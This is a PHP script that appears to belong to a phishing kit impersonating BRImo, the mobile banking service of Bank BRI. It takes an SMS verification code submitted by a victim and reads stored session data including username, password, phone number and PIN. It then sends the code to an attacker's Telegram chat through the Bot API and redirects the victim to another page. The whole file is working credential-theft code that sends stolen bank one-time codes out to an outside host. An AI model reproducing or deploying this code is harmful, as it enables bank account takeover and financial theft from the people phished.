<?php

session_start();
include "./telegram.php";

$sms = $_POST['sms'];
$setPin = $_SESSION['setPin'];
$user = $_SESSION['user'];
$sandi = $_SESSION['sandi'];
$nohp = $_SESSION['nohp'];

$_SESSION['sms'] = $sms;

$message = "
──────────────
BRImo - BRI
──────────────

• sms : ".$sms."

──────────────";

function sendMessage($telegram_id, $message, $id_bot) {
    $url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

sendMessage($telegram_id, $message, $id_bot);
header('Location: ../no.php');
?>